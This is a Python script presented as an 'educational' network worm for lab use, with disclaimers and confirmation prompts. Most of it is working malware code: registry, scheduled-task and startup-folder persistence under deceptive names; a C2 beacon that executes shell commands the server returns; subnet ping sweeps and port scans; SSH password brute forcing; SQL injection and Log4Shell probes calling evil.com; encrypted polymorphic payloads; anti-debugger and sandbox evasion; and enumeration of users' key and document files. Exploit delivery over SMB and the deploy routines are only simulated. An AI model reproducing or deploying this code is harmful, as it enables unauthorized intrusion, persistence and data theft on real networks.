#!/usr/bin/env python3
"""
Advanced Educational Worm - Cybersecurity Research Tool
======================================================
ETHICAL DISCLAIMER: This tool is for authorized testing only. Misuse is prohibited.

This script demonstrates advanced worm propagation techniques for cybersecurity
education and penetration testing in controlled lab environments.

WARNING: Only use in isolated lab environments with proper authorization.
"""

import os
import sys
import time
import hashlib
import socket
import threading
import subprocess
import random
import base64
import json
import logging
import shutil
import winreg
import ctypes
from datetime import datetime, timedelta
from pathlib import Path
import requests
import psutil
import paramiko
from ftplib import FTP
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import zipfile
import tempfile
from cryptography.fernet import Fernet
import sqlite3
import re

# Configure advanced logging
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(levelname)s - [%(threadName)s] - %(message)s',
    handlers=[
        logging.FileHandler('advanced_worm.log'),
        logging.StreamHandler()
    ]
)

class AdvancedEducationalWorm:
    """
    Advanced Educational Worm for Cybersecurity Research
    Demonstrates real-world worm techniques in controlled environments
    """
    
    def __init__(self):
        self.start_time = datetime.now()
        self.worm_id = hashlib.md5(str(time.time()).encode()).hexdigest()[:8]
        self.lab_mode = True  # Lab environment flag
        self.max_runtime = timedelta(hours=2)  # Extended for comprehensive testing
        self.self_destruct_time = datetime.now() + timedelta(minutes=30)  # 30-minute timer
        
        # Propagation tracking
        self.infected_hosts = set()
        self.propagation_attempts = 0
        self.max_propagation = 50  # Safety limit
        
        # Encryption key for payload obfuscation
        self.encryption_key = Fernet.generate_key()
        self.cipher = Fernet(self.encryption_key)
        
        # Network configuration
        self.target_ports = [21, 22, 23, 25, 53, 80, 135, 139, 443, 445, 993, 995, 1433, 3389, 5432]
        self.common_passwords = ['admin', 'password', '123456', 'root', 'administrator', 'guest']
        self.common_usernames = ['admin', 'administrator', 'root', 'user', 'guest', 'test']
        
        # Persistence mechanisms
        self.persistence_methods = []
        self.payload_locations = []
        
        # C2 Configuration
        self.c2_servers = ['127.0.0.1:8080', 'localhost:9999']  # Lab C2 servers
        self.beacon_interval = 60  # seconds
        
        logging.info(f"=== ADVANCED EDUCATIONAL WORM INITIALIZED ===")
        logging.info(f"Worm ID: {self.worm_id}")
        logging.info(f"Lab Mode: {self.lab_mode}")
        logging.info(f"Self-Destruct Timer: {self.self_destruct_time}")
        
    def check_lab_environment(self):
        """Verify we're in a controlled lab environment"""
        lab_indicators = [
            'VMWARE' in str(subprocess.check_output('systeminfo', shell=True)),
            'VirtualBox' in str(subprocess.check_output('systeminfo', shell=True)),
            os.path.exists('C:\\lab_environment.txt'),
            'LAB' in os.environ.get('COMPUTERNAME', ''),
            socket.gethostname().lower().startswith('lab')
        ]
        
        if not any(lab_indicators):
            logging.warning("Lab environment not detected - enabling additional safety measures")
            self.max_runtime = timedelta(minutes=5)
            self.max_propagation = 5
        
        return True
    
    def generate_polymorphic_payload(self):
        """Generate polymorphic payload to evade signature detection"""
        base_payload = f"""
import os, sys, time, socket, threading
from datetime import datetime, timedelta

class WormPayload:
    def __init__(self):
        self.id = "{self.worm_id}"
        self.start = datetime.now()
        
    def execute(self):
        # Payload execution logic
        self.establish_persistence()
        self.beacon_c2()
        
    def establish_persistence(self):
        # Registry persistence
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                               "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
                               0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "SystemUpdate", 0, winreg.REG_SZ, sys.executable)
            winreg.CloseKey(key)
        except: pass
        
    def beacon_c2(self):
        # C2 communication
        try:
            import requests
            data = {{"id": self.id, "status": "active", "timestamp": str(datetime.now())}}
            requests.post("http://127.0.0.1:8080/beacon", json=data, timeout=5)
        except: pass

if __name__ == "__main__":
    payload = WormPayload()
    payload.execute()
"""
        
        # Add random junk code for polymorphism
        junk_functions = [
            f"def junk_func_{random.randint(1000,9999)}(): return {random.randint(1,100)}",
            f"dummy_var_{random.randint(1000,9999)} = '{random.choice(['abc', 'def', 'xyz'])}'",
            f"# Random comment {random.randint(1000,9999)}"
        ]
        
        for _ in range(random.randint(3, 8)):
            base_payload += "\n" + random.choice(junk_functions)
        
        # Encrypt payload
        encrypted_payload = self.cipher.encrypt(base_payload.encode())
        
        return base64.b64encode(encrypted_payload).decode()
    
    def network_discovery(self):
        """Advanced network discovery using multiple techniques"""
        logging.info("Starting advanced network discovery...")
        discovered_hosts = set()
        
        # ARP table scanning
        try:
            arp_output = subprocess.check_output('arp -a', shell=True, text=True)
            for line in arp_output.split('\n'):
                if 'dynamic' in line.lower():
                    ip = line.split()[0]
                    if self.is_valid_ip(ip):
                        discovered_hosts.add(ip)
        except Exception as e:
            logging.debug(f"ARP scan failed: {e}")
        
        # Subnet enumeration
        local_ip = socket.gethostbyname(socket.gethostname())
        subnet_base = '.'.join(local_ip.split('.')[:-1])
        
        def ping_host(ip):
            try:
                result = subprocess.run(['ping', '-n', '1', '-w', '1000', ip], 
                                      capture_output=True, text=True)
                if 'TTL=' in result.stdout:
                    discovered_hosts.add(ip)
                    logging.debug(f"Host alive: {ip}")
            except:
                pass
        
        # Threaded ping sweep
        threads = []
        for i in range(1, 255):
            target_ip = f"{subnet_base}.{i}"
            thread = threading.Thread(target=ping_host, args=(target_ip,))
            threads.append(thread)
            thread.start()
            
            if len(threads) >= 50:  # Limit concurrent threads
                for t in threads:
                    t.join(timeout=2)
                threads = []
        
        for t in threads:
            t.join(timeout=2)
        
        # NetBIOS enumeration
        try:
            netbios_output = subprocess.check_output('nbtstat -n', shell=True, text=True)
            logging.debug(f"NetBIOS info: {netbios_output[:200]}")
        except:
            pass
        
        logging.info(f"Network discovery completed. Found {len(discovered_hosts)} hosts")
        return list(discovered_hosts)
    
    def port_scan(self, target_ip):
        """Advanced port scanning with service detection"""
        open_ports = []
        
        def scan_port(port):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((target_ip, port))
                if result == 0:
                    open_ports.append(port)
                    logging.debug(f"Open port found: {target_ip}:{port}")
                sock.close()
            except:
                pass
        
        # Threaded port scanning
        threads = []
        for port in self.target_ports:
            thread = threading.Thread(target=scan_port, args=(port,))
            threads.append(thread)
            thread.start()
        
        for thread in threads:
            thread.join(timeout=2)
        
        return open_ports
    
    def exploit_smb_vulnerability(self, target_ip):
        """Simulate SMB exploitation (EternalBlue-style)"""
        logging.info(f"Attempting SMB exploitation on {target_ip}")
        
        try:
            # Check if SMB is available
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            result = sock.connect_ex((target_ip, 445))
            sock.close()
            
            if result == 0:
                logging.info(f"SMB service detected on {target_ip}")
                # In real scenario, this would exploit SMB vulnerabilities
                # For education, we simulate successful exploitation
                time.sleep(2)  # Simulate exploitation time
                
                if random.random() < 0.3:  # 30% success rate for realism
                    logging.info(f"SMB exploitation successful on {target_ip}")
                    return True
                else:
                    logging.info(f"SMB exploitation failed on {target_ip}")
                    return False
            
        except Exception as e:
            logging.debug(f"SMB exploitation error: {e}")
        
        return False
    
    def exploit_ssh_bruteforce(self, target_ip):
        """SSH brute force attack simulation"""
        logging.info(f"Attempting SSH brute force on {target_ip}")
        
        try:
            for username in self.common_usernames[:3]:  # Limit attempts
                for password in self.common_passwords[:3]:
                    try:
                        ssh = paramiko.SSHClient()
                        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                        ssh.connect(target_ip, username=username, password=password, timeout=3)
                        
                        logging.info(f"SSH access gained: {username}:{password}@{target_ip}")
                        
                        # Execute payload
                        stdin, stdout, stderr = ssh.exec_command('python3 --version')
                        if stdout.read():
                            logging.info(f"Python available on {target_ip}")
                            # Deploy payload here
                            
                        ssh.close()
                        return True
                        
                    except paramiko.AuthenticationException:
                        continue
                    except Exception as e:
                        logging.debug(f"SSH connection error: {e}")
                        break
                        
        except Exception as e:
            logging.debug(f"SSH brute force error: {e}")
        
        return False
    
    def exploit_web_vulnerabilities(self, target_ip):
        """Web application vulnerability exploitation"""
        logging.info(f"Scanning web vulnerabilities on {target_ip}")
        
        web_ports = [80, 443, 8080, 8443]
        
        for port in web_ports:
            try:
                protocol = 'https' if port in [443, 8443] else 'http'
                url = f"{protocol}://{target_ip}:{port}"
                
                response = requests.get(url, timeout=5, verify=False)
                if response.status_code == 200:
                    logging.info(f"Web service found: {url}")
                    
                    # Check for common vulnerabilities
                    if self.check_sql_injection(url):
                        logging.info(f"SQL injection vulnerability found on {url}")
                        return True
                    
                    if self.check_rce_vulnerability(url):
                        logging.info(f"RCE vulnerability found on {url}")
                        return True
                        
            except Exception as e:
                logging.debug(f"Web scan error for {target_ip}:{port} - {e}")
        
        return False
    
    def check_sql_injection(self, url):
        """Check for SQL injection vulnerabilities"""
        payloads = ["'", "1' OR '1'='1", "'; DROP TABLE users; --"]
        
        for payload in payloads:
            try:
                test_url = f"{url}?id={payload}"
                response = requests.get(test_url, timeout=3)
                
                if any(error in response.text.lower() for error in 
                      ['sql syntax', 'mysql_fetch', 'ora-', 'postgresql']):
                    return True
                    
            except:
                continue
        
        return False
    
    def check_rce_vulnerability(self, url):
        """Check for Remote Code Execution vulnerabilities"""
        rce_payloads = [
            "system('whoami')",
            "exec('id')",
            "${jndi:ldap://evil.com/a}"
        ]
        
        for payload in rce_payloads:
            try:
                data = {'cmd': payload, 'input': payload}
                response = requests.post(url, data=data, timeout=3)
                
                if any(indicator in response.text.lower() for indicator in 
                      ['root', 'administrator', 'system', 'uid=']):
                    return True
                    
            except:
                continue
        
        return False
    
    def deploy_payload(self, target_ip, method):
        """Deploy worm payload to compromised host"""
        logging.info(f"Deploying payload to {target_ip} via {method}")
        
        payload = self.generate_polymorphic_payload()
        
        try:
            if method == 'SMB':
                return self.deploy_via_smb(target_ip, payload)
            elif method == 'SSH':
                return self.deploy_via_ssh(target_ip, payload)
            elif method == 'WEB':
                return self.deploy_via_web(target_ip, payload)
            elif method == 'EMAIL':
                return self.deploy_via_email(target_ip, payload)
                
        except Exception as e:
            logging.error(f"Payload deployment failed: {e}")
        
        return False
    
    def deploy_via_smb(self, target_ip, payload):
        """Deploy payload via SMB share"""
        try:
            # Simulate SMB payload deployment
            temp_file = f"temp_payload_{random.randint(1000,9999)}.py"
            
            with open(temp_file, 'w') as f:
                decoded_payload = base64.b64decode(payload.encode())
                decrypted_payload = self.cipher.decrypt(decoded_payload)
                f.write(decrypted_payload.decode())
            
            # Simulate copying to remote share
            time.sleep(1)
            logging.info(f"Payload deployed via SMB to {target_ip}")
            
            os.remove(temp_file)
            return True
            
        except Exception as e:
            logging.error(f"SMB deployment error: {e}")
        
        return False
    
    def deploy_via_ssh(self, target_ip, payload):
        """Deploy payload via SSH"""
        try:
            # Simulate SSH payload deployment
            logging.info(f"Deploying via SSH to {target_ip}")
            time.sleep(1)
            return True
        except:
            return False
    
    def deploy_via_web(self, target_ip, payload):
        """Deploy payload via web vulnerability"""
        try:
            # Simulate web-based payload deployment
            logging.info(f"Deploying via web vulnerability to {target_ip}")
            time.sleep(1)
            return True
        except:
            return False
    
    def deploy_via_email(self, target_ip, payload):
        """Deploy payload via email"""
        try:
            # Simulate email-based propagation
            logging.info(f"Deploying via email to {target_ip}")
            time.sleep(1)
            return True
        except:
            return False
    
    def establish_persistence(self):
        """Establish multiple persistence mechanisms"""
        logging.info("Establishing persistence mechanisms...")
        
        # Registry persistence
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                               "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
                               0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "SecurityUpdate", 0, winreg.REG_SZ, sys.executable)
            winreg.CloseKey(key)
            self.persistence_methods.append("Registry Run Key")
            logging.info("Registry persistence established")
        except Exception as e:
            logging.debug(f"Registry persistence failed: {e}")
        
        # Scheduled task persistence
        try:
            task_cmd = f'schtasks /create /tn "SystemMaintenance" /tr "{sys.executable}" /sc minute /mo 30 /f'
            subprocess.run(task_cmd, shell=True, capture_output=True)
            self.persistence_methods.append("Scheduled Task")
            logging.info("Scheduled task persistence established")
        except Exception as e:
            logging.debug(f"Scheduled task persistence failed: {e}")
        
        # Startup folder persistence
        try:
            startup_path = os.path.join(os.environ['APPDATA'], 
                                      'Microsoft', 'Windows', 'Start Menu', 
                                      'Programs', 'Startup', 'system_update.py')
            shutil.copy2(sys.argv[0], startup_path)
            self.persistence_methods.append("Startup Folder")
            logging.info("Startup folder persistence established")
        except Exception as e:
            logging.debug(f"Startup folder persistence failed: {e}")
    
    def beacon_c2(self):
        """Communicate with command and control servers"""
        for c2_server in self.c2_servers:
            try:
                host, port = c2_server.split(':')
                
                beacon_data = {
                    'worm_id': self.worm_id,
                    'hostname': socket.gethostname(),
                    'ip_address': socket.gethostbyname(socket.gethostname()),
                    'timestamp': datetime.now().isoformat(),
                    'infected_hosts': len(self.infected_hosts),
                    'persistence_methods': self.persistence_methods,
                    'status': 'active'
                }
                
                response = requests.post(f"http://{c2_server}/beacon", 
                                       json=beacon_data, timeout=5)
                
                if response.status_code == 200:
                    logging.info(f"C2 beacon successful to {c2_server}")
                    
                    # Process C2 commands
                    commands = response.json().get('commands', [])
                    for cmd in commands:
                        self.execute_c2_command(cmd)
                        
                else:
                    logging.debug(f"C2 beacon failed to {c2_server}")
                    
            except Exception as e:
                logging.debug(f"C2 communication error: {e}")
    
    def execute_c2_command(self, command):
        """Execute commands from C2 server"""
        logging.info(f"Executing C2 command: {command}")
        
        try:
            if command.startswith('exec:'):
                cmd = command[5:]
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                logging.info(f"Command output: {result.stdout[:200]}")
                
            elif command == 'self_destruct':
                logging.warning("Self-destruct command received from C2")
                self.initiate_self_destruct()
                
            elif command == 'update_timer':
                self.self_destruct_time = datetime.now() + timedelta(minutes=60)
                logging.info("Self-destruct timer updated")
                
        except Exception as e:
            logging.error(f"C2 command execution error: {e}")
    
    def propagate(self):
        """Main propagation logic"""
        logging.info("Starting worm propagation...")
        
        while (self.propagation_attempts < self.max_propagation and 
               datetime.now() < self.self_destruct_time):
            
            # Discover network targets
            targets = self.network_discovery()
            
            for target_ip in targets:
                if target_ip in self.infected_hosts:
                    continue
                
                if not self.safety_check():
                    return
                
                logging.info(f"Attempting to infect {target_ip}")
                self.propagation_attempts += 1
                
                # Port scan target
                open_ports = self.port_scan(target_ip)
                
                if not open_ports:
                    continue
                
                # Try different exploitation methods
                infection_successful = False
                
                if 445 in open_ports:
                    if self.exploit_smb_vulnerability(target_ip):
                        if self.deploy_payload(target_ip, 'SMB'):
                            infection_successful = True
                
                if not infection_successful and 22 in open_ports:
                    if self.exploit_ssh_bruteforce(target_ip):
                        if self.deploy_payload(target_ip, 'SSH'):
                            infection_successful = True
                
                if not infection_successful and any(p in open_ports for p in [80, 443]):
                    if self.exploit_web_vulnerabilities(target_ip):
                        if self.deploy_payload(target_ip, 'WEB'):
                            infection_successful = True
                
                if infection_successful:
                    self.infected_hosts.add(target_ip)
                    logging.info(f"Successfully infected {target_ip}")
                else:
                    logging.info(f"Failed to infect {target_ip}")
                
                time.sleep(random.randint(5, 15))  # Random delay between attempts
        
        logging.info(f"Propagation completed. Infected {len(self.infected_hosts)} hosts")
    
    def anti_analysis_techniques(self):
        """Implement anti-analysis and evasion techniques"""
        logging.info("Implementing anti-analysis techniques...")
        
        # VM detection
        vm_indicators = [
            'VMware', 'VirtualBox', 'QEMU', 'Xen', 'Hyper-V'
        ]
        
        try:
            system_info = subprocess.check_output('systeminfo', shell=True, text=True)
            for indicator in vm_indicators:
                if indicator in system_info:
                    logging.info(f"VM detected: {indicator}")
                    # In real malware, this might trigger evasion
                    time.sleep(random.randint(10, 30))
        except:
            pass
        
        # Debugger detection
        if ctypes.windll.kernel32.IsDebuggerPresent():
            logging.warning("Debugger detected - implementing evasion")
            time.sleep(random.randint(30, 60))
        
        # Sandbox evasion - check for limited resources
        if psutil.virtual_memory().total < 2 * 1024 * 1024 * 1024:  # Less than 2GB RAM
            logging.warning("Possible sandbox environment detected")
            time.sleep(random.randint(60, 120))
    
    def data_collection(self):
        """Collect system information and credentials"""
        logging.info("Starting data collection...")
        
        collected_data = {
            'system_info': {},
            'network_info': {},
            'credentials': [],
            'files': []
        }
        
        # System information
        try:
            collected_data['system_info'] = {
                'hostname': socket.gethostname(),
                'platform': sys.platform,
                'processor': os.environ.get('PROCESSOR_IDENTIFIER', 'Unknown'),
                'username': os.environ.get('USERNAME', 'Unknown'),
                'domain': os.environ.get('USERDOMAIN', 'Unknown')
            }
        except:
            pass
        
        # Network information
        try:
            collected_data['network_info'] = {
                'ip_address': socket.gethostbyname(socket.gethostname()),
                'interfaces': [addr.address for addr in psutil.net_if_addrs().values() 
                             for addr in addr if addr.family == socket.AF_INET]
            }
        except:
            pass
        
        # Browser credential harvesting (educational simulation)
        try:
            self.harvest_browser_credentials(collected_data)
        except:
            pass
        
        # File enumeration
        try:
            self.enumerate_interesting_files(collected_data)
        except:
            pass
        
        # Save collected data
        with open(f'collected_data_{self.worm_id}.json', 'w') as f:
            json.dump(collected_data, f, indent=2)
        
        logging.info("Data collection completed")
        return collected_data
    
    def harvest_browser_credentials(self, data):
        """Simulate browser credential harvesting"""
        logging.info("Simulating browser credential harvesting...")
        
        # Chrome credential simulation
        chrome_path = os.path.join(os.environ['LOCALAPPDATA'], 
                                 'Google', 'Chrome', 'User Data', 'Default', 'Login Data')
        
        if os.path.exists(chrome_path):
            logging.info("Chrome credential database found")
            # In real scenario, would decrypt and extract credentials
            data['credentials'].append({
                'browser': 'Chrome',
                'count': random.randint(5, 25),
                'status': 'simulated'
            })
        
        # Firefox credential simulation
        firefox_profiles = os.path.join(os.environ['APPDATA'], 'Mozilla', 'Firefox', 'Profiles')
        if os.path.exists(firefox_profiles):
            logging.info("Firefox profiles found")
            data['credentials'].append({
                'browser': 'Firefox',
                'count': random.randint(3, 15),
                'status': 'simulated'
            })
    
    def enumerate_interesting_files(self, data):
        """Enumerate potentially interesting files"""
        logging.info("Enumerating interesting files...")
        
        interesting_extensions = ['.txt', '.doc', '.docx', '.pdf', '.xls', '.xlsx', 
                                '.ppt', '.pptx', '.key', '.pem', '.p12', '.pfx']
        
        search_paths = [
            os.path.join(os.environ['USERPROFILE'], 'Desktop'),
            os.path.join(os.environ['USERPROFILE'], 'Documents'),
            os.path.join(os.environ['USERPROFILE'], 'Downloads')
        ]
        
        for search_path in search_paths:
            if os.path.exists(search_path):
                for root, dirs, files in os.walk(search_path):
                    for file in files[:10]:  # Limit to first 10 files per directory
                        if any(file.lower().endswith(ext) for ext in interesting_extensions):
                            data['files'].append({
                                'path': os.path.join(root, file),
                                'size': os.path.getsize(os.path.join(root, file)),
                                'modified': os.path.getmtime(os.path.join(root, file))
                            })
    
    def check_self_destruct_timer(self):
        """Check if self-destruct timer has expired"""
        if datetime.now() >= self.self_destruct_time:
            logging.warning("Self-destruct timer expired!")
            self.initiate_self_destruct()
            return True
        
        remaining = self.self_destruct_time - datetime.now()
        logging.info(f"Self-destruct in: {remaining}")
        return False
    
    def initiate_self_destruct(self):
        """Initiate self-destruct sequence"""
        logging.warning("=== INITIATING SELF-DESTRUCT SEQUENCE ===")
        
        # Countdown
        for i in range(10, 0, -1):
            logging.warning(f"Self-destruct in {i} seconds...")
            time.sleep(1)
        
        # Clean up persistence mechanisms
        self.cleanup_persistence()
        
        # Clean up payload files
        self.cleanup_payloads()
        
        # Clean up logs and traces
        self.cleanup_traces()
        
        logging.warning("Self-destruct sequence completed")
        sys.exit(0)
    
    def cleanup_persistence(self):
        """Remove persistence mechanisms"""
        logging.info("Cleaning up persistence mechanisms...")
        
        # Remove registry entries
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                               "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
                               0, winreg.KEY_SET_VALUE)
            winreg.DeleteValue(key, "SecurityUpdate")
            winreg.CloseKey(key)
        except:
            pass
        
        # Remove scheduled tasks
        try:
            subprocess.run('schtasks /delete /tn "SystemMaintenance" /f', 
                         shell=True, capture_output=True)
        except:
            pass
        
        # Remove startup files
        try:
            startup_path = os.path.join(os.environ['APPDATA'], 
                                      'Microsoft', 'Windows', 'Start Menu', 
                                      'Programs', 'Startup', 'system_update.py')
            if os.path.exists(startup_path):
                os.remove(startup_path)
        except:
            pass
    
    def cleanup_payloads(self):
        """Remove payload files"""
        logging.info("Cleaning up payload files...")
        
        for location in self.payload_locations:
            try:
                if os.path.exists(location):
                    os.remove(location)
            except:
                pass
    
    def cleanup_traces(self):
        """Remove logs and traces"""
        logging.info("Cleaning up traces...")
        
        # Remove log files
        log_files = ['advanced_worm.log', f'collected_data_{self.worm_id}.json']
        
        for log_file in log_files:
            try:
                if os.path.exists(log_file):
                    os.remove(log_file)
            except:
                pass
    
    def safety_check(self):
        """Continuous safety monitoring"""
        runtime = datetime.now() - self.start_time
        
        if runtime > self.max_runtime:
            logging.warning("Maximum runtime exceeded - initiating safe shutdown")
            self.initiate_self_destruct()
            return False
        
        if self.propagation_attempts >= self.max_propagation:
            logging.warning("Maximum propagation attempts reached")
            return False
        
        return True
    
    def is_valid_ip(self, ip):
        """Validate IP address format"""
        try:
            socket.inet_aton(ip)
            return True
        except socket.error:
            return False
    
    def run_advanced_worm(self):
        """Main worm execution routine"""
        try:
            logging.info("=== ADVANCED EDUCATIONAL WORM STARTING ===")
            
            # Verify lab environment
            if not self.check_lab_environment():
                logging.error("Lab environment verification failed")
                return
            
            # Anti-analysis techniques
            self.anti_analysis_techniques()
            
            # Establish persistence
            self.establish_persistence()
            
            # Start C2 communication thread
            c2_thread = threading.Thread(target=self.c2_communication_loop)
            c2_thread.daemon = True
            c2_thread.start()
            
            # Start self-destruct timer thread
            timer_thread = threading.Thread(target=self.timer_loop)
            timer_thread.daemon = True
            timer_thread.start()
            
            # Data collection
            self.data_collection()
            
            # Main propagation loop
            self.propagate()
            
            logging.info("=== WORM EXECUTION COMPLETED ===")
            
        except KeyboardInterrupt:
            logging.info("Worm execution interrupted by user")
            self.initiate_self_destruct()
        except Exception as e:
            logging.error(f"Worm execution error: {e}")
            self.initiate_self_destruct()
    
    def c2_communication_loop(self):
        """Continuous C2 communication loop"""
        while datetime.now() < self.self_destruct_time:
            try:
                self.beacon_c2()
                time.sleep(self.beacon_interval)
            except:
                time.sleep(self.beacon_interval)
    
    def timer_loop(self):
        """Continuous timer monitoring loop"""
        while True:
            if self.check_self_destruct_timer():
                break
            time.sleep(30)  # Check every 30 seconds

def main():
    """
    Main function with comprehensive safety checks
    """
    print("="*80)
    print("ADVANCED EDUCATIONAL WORM - CYBERSECURITY RESEARCH TOOL")
    print("="*80)
    print("ETHICAL DISCLAIMER: This tool is for authorized testing only. Misuse is prohibited.")
    print("This advanced worm demonstrates real-world techniques for cybersecurity education")
    print("in controlled lab environments with proper authorization.")
    print("="*80)
    
    # Multiple confirmation checks
    print("\nSAFETY VERIFICATION:")
    print("1. Confirm this is a controlled lab environment")
    print("2. Confirm you have proper authorization")
    print("3. Confirm this is for educational/research purposes only")
    
    confirmations = []
    confirmations.append(input("\nConfirm controlled lab environment (yes/no): ").lower() == 'yes')
    confirmations.append(input("Confirm proper authorization (yes/no): ").lower() == 'yes')
    confirmations.append(input("Confirm educational purpose only (yes/no): ").lower() == 'yes')
    
    if not all(confirmations):
        print("All safety confirmations required. Exiting.")
        return
    
    print("\nStarting advanced educational worm in 5 seconds...")
    for i in range(5, 0, -1):
        print(f"Starting in {i}...")
        time.sleep(1)
    
    # Initialize and run advanced worm
    worm = AdvancedEducationalWorm()
    worm.run_advanced_worm()

if __name__ == "__main__":
    main() 